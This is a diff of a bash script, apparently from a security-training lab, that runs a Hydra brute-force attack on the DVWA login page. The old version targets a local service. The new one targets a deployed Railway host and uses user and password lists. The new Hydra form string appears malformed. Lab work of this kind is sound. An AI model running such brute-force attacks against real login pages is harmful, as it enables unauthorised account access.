@@ -1,30 +1,14 @@
-#!/usr/bin/env bash
-#
-# denis-play-backend/plays/play-02-hydra-dvwa/run.sh
+#!/bin/bash
 
+# Play 02 — Hydra DVWA
+# Usa a variável DVWA_HOST (ou o default hard-coded) para apontar ao DVWA em prod
 
-# muda para o diretório do script
+# Se tiver definido DVWA_HOST nas vars do Railway, usa; senão, cai no padrão:
+TARGET="${DVWA_HOST:-web-dvwa-production.up.railway.app}:80"
 
-cd "$(dirname "$0")"
+echo "[*] Iniciando ataque com Hydra contra $TARGET..."
+hydra -L users.txt -P passwords.txt \
+  http-post-form "http://$TARGET/login.php:username=^USER^&password=^PASS^&Login=Login failed" \
+  -o hydra-out.txt 2>&1
 
-# host e porta padrão (serviço docker-compose)
-
-HOST=${1:-dvwa}
-PORT=${2:-80}
-
-echo "[*] Iniciando ataque com Hydra contra $HOST:$PORT..."
-sleep 1
-
-# hydra espera primeiro o HOST (sem :porta) e -s porta separadamente
-hydra -l admin \
-      -P passwords.txt \
-      -s "$PORT" \
-      "$HOST" http-form-post \
-      "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
-      -t 4 -V > resultado.txt
-
-echo
-echo "[📄] Saída do Hydra:"
-cat resultado.txt
-echo
 echo "[✔️] Teste concluído com sucesso."
